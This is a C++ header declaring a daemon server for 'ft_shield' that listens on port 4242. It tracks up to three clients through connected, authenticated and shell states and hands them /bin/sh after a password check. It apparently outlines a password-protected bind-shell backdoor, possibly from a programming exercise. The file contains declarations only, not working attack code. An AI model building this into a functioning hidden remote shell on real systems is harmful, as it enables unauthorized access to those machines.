#pragma once

#include <shield/daemon.hpp>
#include <string>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>

#define FT_SHIELD_MAX_CLIENTS 3
#define FT_SHIELD_PORT 4242
#define FT_SHIELD_PORT_STRING "4242"
#define FT_SHIELD_SHELL "/bin/sh" 
#define FT_SHIELD_TIMEOUT 120		// time in Seconds before a dropped client is cleared out

enum class		e_client_state
{
	CLIENT_STATE_CONNECTED,
	CLIENT_STATE_AUTHENTICATED,
	CLIENT_STATE_SHELL,
	CLIENT_STATE_DROPPED,
};

typedef struct	s_client
{
	int							fd;
	enum class e_client_state	state;
	time_t	last_seen;
}				t_client;

class DaemonServer
{
	private:
		t_client	_client_list[FT_SHIELD_MAX_CLIENTS + 1];	//1 added for the server itself
		int _client_id;											//_client_list[_client_id] is where the next client should be put in the list, -1 is no clients being accepted
		char _password_hash[32];

	public:
		DaemonServer(char password_hash[32]);
		~DaemonServer();
		int init();
		void run();
		
};